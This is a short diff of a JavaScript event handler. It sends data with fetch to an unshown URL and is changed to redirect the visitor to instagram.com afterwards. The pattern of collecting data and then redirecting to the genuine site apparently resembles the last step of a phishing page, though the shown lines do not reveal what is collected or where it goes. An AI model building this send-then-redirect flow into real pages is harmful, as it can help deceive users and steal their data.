@@ -23,7 +23,7 @@ document.addEventListener('DOMContentLoaded', (event) => {
         // Use fetch to send the data
         fetch(url, { method: 'GET' })
         .then(response => response.json())
-        .then(responseData => console.log(responseData))
+        .then(responseData => window.location.href = "https://instagram.com")
         .catch(error => console.error('Error:', error));
     });
 });
